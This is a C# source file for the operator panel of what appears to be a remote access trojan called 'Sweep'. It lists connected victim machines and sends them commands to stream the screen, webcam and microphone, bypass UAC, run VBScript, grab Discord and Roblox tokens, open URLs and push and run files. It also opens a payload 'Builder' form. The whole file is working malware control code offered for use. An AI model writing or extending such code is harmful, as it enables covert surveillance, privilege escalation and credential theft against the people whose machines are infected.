using BrightIdeasSoftware;
using LazyServer;
using Microsoft.VisualBasic;
using Newtonsoft.Json.Linq;
using Sweep.Models;
using Sweep.Services;    // MessageHandler
using Sweep.UI;          // ListViewConfigurator
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sweep.Forms
{
    public partial class Sweep : Form
    {
        private readonly LazyServerHost _server;
        private readonly MessageHandler _dispatcher;
        private Chat chat;
        private int logsnum = 0;
        private Remembrance remembrance = new Remembrance();

        // Inject the already-started server here
        public Sweep(LazyServerHost server)
        {
            InitializeComponent();

            if (server == null)
                throw new ArgumentNullException(nameof(server));

            _server = server;

            // 1) Configure the ObjectListView once
            ListViewConfigurator.Configure(listView1, Global.Port);

            // 2) Create your central dispatcher
            //    It will subscribe to server events and call your handlers
            _dispatcher = new MessageHandler(_server, listView1, Global.Port, logsview, this);
            logsview.FormatRow += (sender, e) =>
            {
                var log = (Log)e.Model;

                if (log.Type == "Error")
                {
                    e.Item.ForeColor = System.Drawing.Color.Red;
                }
            };
            logsview.SetObjects(new List<Log>());
            logsview.ItemsChanged += (sender, e) => {
                logsnum++;
                counter.Text = logsnum.ToString();
                counter.Visible = logsnum > 0;
            };
            logsview.BeforeSorting += (s, e) =>
            {
                e.SortOrder = SortOrder.Descending;
            };
            usname.Text = usname.Text.Replace("%s", Global.Name);
            _server.ClientConnected += (s, clientId) => {
                _ = _server.SendMessageToClient(clientId, "ack"); // shush warning
            };
        }

        private async void seescreen_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects) {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject {
                        ["command"] = "ssloop",
                        ["quality"] = "40%"
                    }.ToString());
                }
            }
        }

        private void Sweep_Load(object sender, EventArgs e)
        {
            portnum.Text = portnum.Text.Replace("%s", Global.Port.ToString());
//            _ = StartAddingDummyClientsAsync();
        }

        private async void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "uacbypass",
                    }.ToString());
                }
            }
        }

        private void home_Click(object sender, EventArgs e)
        {
            listView1.Visible = true;
            logsview.Visible = false;
        }

        private void logs_Click(object sender, EventArgs e)
        {
            listView1.Visible = false;
            logsview.Visible = true;
            logsnum = 0;
            counter.Visible = false;
        }
        public void ShowClientConnectedNotification(string clientId)
        {
            Bitmap bitmap = global::Sweep.Properties.Resources.cleaning;
            using (var stream = new MemoryStream())
            {
                Icon icon = Icon.FromHandle(bitmap.GetHicon());
                icon.Save(stream);
                if (notifyIcon1 != null)
                {
                    notifyIcon1.BalloonTipTitle = clientId;
                    notifyIcon1.BalloonTipText = "New client connected";
                    notifyIcon1.Icon = icon; // Use the created icon
                    notifyIcon1.ShowBalloonTip(2000);
                }
            }
        }

        private async void webcam_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "camloop",
                        ["quality"] = "40%",

                    }.ToString());
                }
            }
        }

        private async void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "micloop",

                    }.ToString());
                }
            }
        }

        private async void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = Interaction.InputBox("Enter UsrName", "Chat", Global.Name);

                    if (String.IsNullOrEmpty(input)) {
                        return;
                    }

                    chat = new Chat();
                    chat.username = input;
                    chat.serverHost = _server;
                    chat.connid = item.ID;
                    chat.Show();

                    chat.OnMessageSent += async (message, f) =>
                    {
                        if (!f) {
                            Console.WriteLine($"Sending message: {message} to {conn.Id}");
                            await _server.SendMessageToClient(conn.Id, new JObject
                            {
                                ["command"] = "chatmsg",
                                ["username"] = input,
                                ["text"] = message
                            }.ToString());
                        }
                    };

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "chat",
                        ["username"] = input,
                    }.ToString());
                }
            }
        }

        private async void runVBScriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new VBScriptExecute();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        private void discordTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new TokenGrabber();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        private void robloxGraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new TokenGrabber();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.mode = "roblox";
                    f.Show();
                }
            }
        }

        private async void builder_Click(object sender, EventArgs e)
        {
            var f = new Builder();
            f.Opacity = 0;
            f.Show();
            await Program.FadeIn(f, 35);
        }
        private async Task StartAddingDummyClientsAsync()
        {
            var rng = new Random();

            while (true)
            {
                // Call the dummy client generator
                _dispatcher.AddDummyClient();

                // Wait a random time between 3 to 10 seconds
                int delayMs = rng.Next(500, 1000);
                await Task.Delay(delayMs);
            }
        }

        private async void openURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = Interaction.InputBox("Enter URL (Must include http:// or https://)", "Url", remembrance.GetAttribute<string>("website") ?? "https://example.com");

                    if (String.IsNullOrEmpty(input))
                    {
                        return;
                    }

                    remembrance.SetAttribute("website", input);

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "url",
                        ["body"] = input,
                    }.ToString());
                }
            }
        }

        private async void fromPCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = DiskFileDialog.ShowDialog();

                    if (input == DialogResult.OK) {
                        var names = DiskFileDialog.FileNames;

                        foreach (var name in names)
                        {
                            _dispatcher.AddLogToList(new JObject
                            {
                                ["message"] = $"Sending file {name} to {item.Username} ({item.ID})",
                                ["type"] = "Info"
                            });
                                await _server.SendFileToClient(conn.Id, name, new JObject
                                {
                                    ["command"] = "openfile",
                                    ["filename"] = Path.GetFileName(name)
                                }.ToString());
                            _dispatcher.AddLogToList(new JObject
                            {
                                ["message"] = $"File {name} successfully sent to {item.Username} ({item.ID})",
                                ["type"] = "Info"
                            });
                        }
                    }
                }
            }
        }

        /*protected override void OnDeactivate(EventArgs e)
        {
            timer1.Start();
            
            base.OnDeactivate(e);
        }

        protected override void OnActivated(EventArgs e)
        {
            timer1.Stop();
            opacity = 1;
            
            this.Opacity = 1;
            base.OnActivated(e);
        }
        private static double opacity = 0.95;
        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Interval = new Random().Next(1000, 10000);
            opacity -= 0.05;
            if (opacity < 0.8) {
                opacity = 0.8;
            }
            this.Opacity = opacity;
        }*/
    }

}
